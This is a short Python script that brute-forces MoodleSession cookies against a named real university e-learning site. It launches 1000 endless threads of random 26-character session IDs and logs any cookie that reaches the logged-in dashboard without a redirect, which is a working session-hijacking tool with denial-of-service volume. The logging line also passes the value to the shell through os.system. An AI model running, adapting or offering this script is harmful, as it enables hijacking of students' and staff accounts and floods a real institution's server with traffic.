import requests
import threading
import secrets
import string
import os
url = 'https://emasomo.cuk.ac.ke/my/index.php' 
def generator(length):
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def myrequest(cookies):
    cookies = {'MoodleSession': f'{cookies}'} 
    response = requests.get(url, cookies=cookies, allow_redirects=False)
    if response.status_code == 200:  
        if 'Location' not in response.headers:
            c=f"{cookies}"
            print(c)
            os.system(f"echo {c} >> sessions.log")
        else:
            print("Success - Redirect Detected")
    else:
        print(f"Request failed with status code: {response.status_code}")

def main():
    while True:
        myrequest(generator(26))

for i in range(1000):
    t=threading.Thread(target=main)
    t.start()